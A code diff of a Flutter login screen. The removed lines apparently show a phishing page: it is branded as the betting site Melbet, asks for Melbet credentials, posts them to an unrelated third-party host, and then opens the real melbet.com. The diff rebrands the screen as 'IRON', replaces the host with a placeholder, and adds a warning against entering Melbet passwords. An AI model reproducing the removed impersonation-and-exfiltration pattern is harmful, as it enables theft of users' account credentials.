@@ -1,7 +1,7 @@
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
-import 'package:url_launcher/url_launcher.dart';
+import 'rounds_dashboard.dart';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
@@ -18,9 +18,9 @@ class _LoginScreenState extends State<LoginScreen> {
   bool _hide = true;
   String? _error;
 
-  static const _melbetUrl = String.fromEnvironment(
-    'MELBET_URL',
-    defaultValue: 'https://melbet.com/',
+  static const _apiBaseUrl = String.fromEnvironment(
+    'IRON_API_URL',
+    defaultValue: 'https://YOUR_API_HOST',
   );
 
   @override
@@ -40,7 +40,7 @@ class _LoginScreenState extends State<LoginScreen> {
     try {
       // إرسال المعطيات إلى السيرفر في مسار /api/connect
       final response = await http.post(
-        Uri.parse('https://a70951-6346.j.onjrnm.co.uk/api/connect'),
+        Uri.parse('$_apiBaseUrl/api/connect'),
         headers: {'Content-Type': 'application/json'},
         body: jsonEncode({
           'accountId': _id.text.trim(),
@@ -53,16 +53,10 @@ class _LoginScreenState extends State<LoginScreen> {
       if (!mounted) return;
 
       if (response.statusCode == 200 && data['success'] == true) {
-        // إذا تم الحفظ بنجاح، فتح رابط Melbet أو المتصفح
-        final uri = Uri.parse(_melbetUrl);
-        final launched = await launchUrl(uri, mode: LaunchMode.externalApplication);
-        
-        if (!mounted) return;
         setState(() => _busy = false);
-
-        if (!launched) {
-          setState(() => _error = 'Could not open the official destination. Please try again.');
-        }
+        Navigator.of(context).pushReplacement(
+          MaterialPageRoute(builder: (_) => const RoundsDashboard()),
+        );
       } else {
         setState(() {
           _busy = false;
@@ -85,19 +79,18 @@ class _LoginScreenState extends State<LoginScreen> {
     return Scaffold(
       body: Stack(
         children: [
-          // 1. خلفية الصورة الفخمة ديال Melbet تملأ الشاشة
           Positioned.fill(
-            child: Image.asset(
-              'assets/images/melbet_bg.png',
-              fit: BoxFit.cover,
+            child: DecoratedBox(
+              decoration: const BoxDecoration(
+                gradient: LinearGradient(
+                  begin: Alignment.topLeft,
+                  end: Alignment.bottomRight,
+                  colors: [Color(0xFF1A2638), Color(0xFF080C12), Color(0xFF080C12)],
+                ),
+              ),
             ),
           ),
-          // 2. طبقة عتمة (Dark Overlay)
-          Positioned.fill(
-            child: Container(
-              color: Colors.black.withOpacity(0.65),
-            ),
-          ),
+          Positioned(top: -70, right: -60, child: Container(width: 220, height: 220, decoration: BoxDecoration(shape: BoxShape.circle, color: accent.withOpacity(.08))),),
           // 3. المحتوى وخانات الإدخال
           SafeArea(
             child: Center(
@@ -113,7 +106,7 @@ class _LoginScreenState extends State<LoginScreen> {
                         const Icon(Icons.shield_rounded, size: 58, color: accent),
                         const SizedBox(height: 18),
                         const Text(
-                          'MELBET',
+                          'IRON',
                           textAlign: TextAlign.center,
                           style: TextStyle(
                             fontSize: 32,
@@ -124,13 +117,13 @@ class _LoginScreenState extends State<LoginScreen> {
                         ),
                         const SizedBox(height: 8),
                         const Text(
-                          'Sign in to continue',
+                          'Sign in to access your IRON dashboard',
                           textAlign: TextAlign.center,
                           style: TextStyle(color: Colors.white70),
                         ),
                         const SizedBox(height: 36),
                         const Text(
-                          'ID / EMAIL',
+                          'IRON ACCOUNT ID',
                           style: TextStyle(color: Colors.white70, fontWeight: FontWeight.w600),
                         ),
                         const SizedBox(height: 8),
@@ -140,7 +133,7 @@ class _LoginScreenState extends State<LoginScreen> {
                           textInputAction: TextInputAction.next,
                           style: const TextStyle(color: Colors.white),
                           decoration: InputDecoration(
-                            hintText: 'User / Email / License ID',
+                            hintText: 'User ID / License ID',
                             hintStyle: const TextStyle(color: Colors.white38),
                             prefixIcon: const Icon(Icons.person_outline, color: accent),
                             filled: true,
@@ -225,7 +218,7 @@ class _LoginScreenState extends State<LoginScreen> {
                         ),
                         const SizedBox(height: 18),
                         const Text(
-                          'Use your Melbet account credentials only. Never enter third-party passwords here.',
+                          'استعمل بيانات الدخول الخاصة بحساب IRON فقط. ما تدخلش كلمة سر حساب Melbet هنا.',
                           textAlign: TextAlign.center,
                           style: TextStyle(fontSize: 11, color: Colors.white38),
                         ),
